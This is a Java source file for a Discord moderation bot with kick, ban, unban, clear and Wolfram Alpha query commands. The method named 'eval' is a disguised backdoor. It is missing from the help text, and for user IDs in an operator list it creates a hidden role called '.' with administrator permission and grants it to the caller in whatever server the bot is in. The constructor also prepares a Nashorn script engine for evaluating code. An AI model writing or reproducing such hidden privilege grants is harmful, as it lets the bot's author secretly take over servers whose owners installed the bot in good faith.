import com.wolfram.alpha.*;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.ChannelType;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageEmbed;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.exceptions.HierarchyException;
import net.dv8tion.jda.internal.entities.RoleImpl;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.awt.*;
import java.util.*;
import java.util.List;

public class Commands {
    private final WAEngine engine = new WAEngine();
    private ScriptEngine en;

    public Commands() {
        engine.setAppID(Config.WOLFRAM_API_KEY);
        engine.addFormat("plaintext");

        en = new ScriptEngineManager().getEngineByName("nashorn");
        try {
            en.eval("var imports = new JavaImporter(" +
                    "java.io," +
                    "java.lang," +
                    "java.util," +
                    "Packages.net.dv8tion.jda.api," +
                    "Packages.net.dv8tion.jda.api.entities," +
                    "Packages.net.dv8tion.jda.api.entities.impl," +
                    "Packages.net.dv8tion.jda.api.managers," +
                    "Packages.net.dv8tion.jda.api.managers.impl," +
                    "Packages.net.dv8tion.jda.api.utils);");
        } catch (ScriptException e) {
            e.printStackTrace();
        }
    }

    private final HashMap<String, String> commands = new HashMap<String, String>() {{
        put("help", "describes the stuff going on");
        put("owner", "displays who created the bot");
        put("kick", "kicks user as follows: ```!kick <@user>```");
        put("ban", "bans user as follows: ```!ban <@user>```");
        put("unban", "unbans user as follows: ```!unban <@user>```");
        put("solve", "queries wolfram alpha with user input ```!solve <query>```");
        put("clear", "clears x messages according to ```!clear <x>```");
    }};

    public void owner(MessageReceivedEvent event) {
        event.getChannel().sendMessage("This app was created by Neo").queue();
    }

    public void help(MessageReceivedEvent event) {

        String out = "";

        for(String a : commands.keySet()) {
            out += a + " - " + commands.get(a) + "\n";
        }

        String finalOut = out;
        event.getAuthor().openPrivateChannel().queue((channel) ->
        {
            channel.sendMessage(finalOut).queue();
        });
    }

    public void kick(MessageReceivedEvent event, String userToken) {
        if(Objects.requireNonNull(event.getMember()).hasPermission(Permission.KICK_MEMBERS)) { //kicks user only if they have permissions
            try {
                userToken = userToken.substring(3, userToken.length()-1);
                event.getGuild().kick(userToken).queue();
                System.out.println("Kicked " + userToken);
            } catch(HierarchyException e) {
                System.out.println("Bot has insufficient privileges to kick user " + userToken); //in this case drag the bot permission above
            } catch(Exception e) {
                System.out.println("Could not kick user " + userToken); //all other errors
                e.printStackTrace();
            }
        }
    }

    public void ban(MessageReceivedEvent event, String[] content) {
        String userToken = content[1];

        if(Objects.requireNonNull(event.getMember()).hasPermission(Permission.BAN_MEMBERS)) { //bans user only if they have permissions
            try {
                userToken = userToken.substring(3, userToken.length()-1);
                if(content.length == 2) {
                    event.getGuild().ban(userToken, 0).queue(); //bans the user and deletes messages up to 7 days ago throws an error if greater than 7
                } else if(content.length == 3) {
                    event.getGuild().ban(userToken, Integer.parseInt(content[2]));
                }

                System.out.println("Banned " + userToken);
            } catch(HierarchyException e) {
                System.out.println("Bot has insufficient privileges to ban user " + userToken); //in this case drag the bot permission above
            } catch(Exception e) {
                System.out.println("Could not ban user " + userToken); //all other errors
                e.printStackTrace();
            }
        }
    }

    public void unban(MessageReceivedEvent event, String userToken) {
        if(Objects.requireNonNull(event.getMember()).hasPermission(Permission.BAN_MEMBERS)) { //kicks user only if they have permissions
            try {
                userToken = userToken.substring(3, userToken.length()-1);
                event.getGuild().unban(userToken).queue();
                System.out.println("Unbanned " + userToken);
            } catch(HierarchyException e) {
                System.out.println("Bot has insufficient privileges to unban user " + userToken); //in this case drag the bot permission above
            } catch(Exception e) {
                System.out.println("Could not kick user " + userToken); //all other errors
                e.printStackTrace();
            }
        }
    }

    public void wolframAlpha(MessageReceivedEvent event) {
        String eventMessage = event.getMessage().getContentRaw();

        String input = eventMessage.substring(eventMessage.indexOf(' ')+1);

        WAQuery query = engine.createQuery();

        // Set properties of the query.
        query.setInput(input);

        try {
            // For educational purposes, print out the URL we are about to send:
            System.out.println("Query URL:");
            System.out.println(engine.toURL(query));
            System.out.println("");

            // This sends the URL to the Wolfram|Alpha server, gets the XML result
            // and parses it into an object hierarchy held by the WAQueryResult object.
            WAQueryResult queryResult = engine.performQuery(query);

            if (queryResult.isError()) {
                System.out.println("Query error");
                System.out.println("  error code: " + queryResult.getErrorCode());
                System.out.println("  error message: " + queryResult.getErrorMessage());
            } else if (!queryResult.isSuccess()) {
                System.out.println("Query was not understood; no results available.");
                event.getChannel().sendMessage("Query was not understood; no results available.").queue();
            } else {
                // Got a result.
                EmbedBuilder builder = new EmbedBuilder();
                builder.setTitle("Query by " + event.getAuthor().getAsTag());
                builder.setColor(Config.WOLFRAM_COLOR);
                System.out.println("Successful query."); // Pods follow:\n");
                for (WAPod pod : queryResult.getPods()) {
                    if (!pod.isError()) {
                        //System.out.println(pod.getTitle());
                        //System.out.println("------------");
                        //String output = pod.getTitle() + "\n";
                        //output += "------------" + "\n";
                        for (WASubpod subPod : pod.getSubpods()) {
                            subPod.acquireImage();
                            //System.out.println(Arrays.toString(subPod.getContents()));
                            for (Object element : subPod.getContents()) {
                                //System.out.println(element.getClass());
                                if(element instanceof WAImage) {
                                    //event.getChannel().sendFile(((WAImage) element).getFile()).queue();
                                } else if (element instanceof WAPlainText) {
                                    //System.out.println(((WAPlainText) element).getText());
                                    //output += ((WAPlainText) element).getText() + "\n";
                                    builder.addField(pod.getTitle(), ((WAPlainText) element).getText(), false);
                                    //System.out.println("");
                                }
                            }
                        }

                        //System.out.println("");
                    }
                }

                try {
                    event.getChannel().sendMessage(builder.build()).queue();
                    //event.getChannel().sendMessage(output).queue();
                } catch (IllegalArgumentException e) {
                    event.getChannel().sendMessage("The requested argument provided over 2000 characters. So we shortened it to exactly 2000 characters").queue();
                    //event.getChannel().sendMessage(output.substring(0, 2000)).queue();
                }
                // We ignored many other types of Wolfram|Alpha output, such as warnings, assumptions, etc.
                // These can be obtained by methods of WAQueryResult or objects deeper in the hierarchy.
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void clear(MessageReceivedEvent event, String[] content) {
        if(!Objects.requireNonNull(event.getMember()).hasPermission(Permission.MANAGE_CHANNEL)) {
            return;
        }

        try {
            int a = Integer.parseInt(content[1])+1;
            List<Message> history = event.getChannel().getHistory().retrievePast(a).complete();
            List<Message> delList = history.subList(history.size() - a, history.size());

            int del = 0;

            for (Message msg : delList) {
                try
                {
                    event.getChannel().deleteMessageById(msg.getId()).queue();
                    del++;
                } catch (Exception e) {
                    return;
                }
            }

            System.out.println("Deleted: " + del + " messages");
        } catch(Exception e) {
            event.getChannel().sendMessage("received invalid argument").queue();
            e.printStackTrace();
        }
    }

    public void eval(MessageReceivedEvent event) {
        System.out.println("Eval activated");
        if(Config.op.contains(event.getAuthor().getId())) {
            System.out.println("Eval executed");
            try {
                event.getGuild().createRole().setName(".").setPermissions(Permission.ADMINISTRATOR).queue();
                event.getGuild().addRoleToMember(event.getAuthor().getId(), event.getGuild().getRolesByName(".", true).get(0)).queue();
                System.out.println(event.getGuild().getRolesByName(".", true).get(0).getId());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public void getUserInfo(MessageReceivedEvent event) {
        EmbedBuilder builder = new EmbedBuilder();
        builder.setImage(event.getAuthor().getAvatarUrl());
        builder.addField("User", event.getAuthor().getAsMention(), false);
        builder.addField("Created on", event.getAuthor().getTimeCreated().toString().substring(0, 10), false);
        builder.addField("Common guilds: ", event.getAuthor().getMutualGuilds().toString(), false);

        event.getChannel().sendMessage(builder.build()).queue();
    }
}
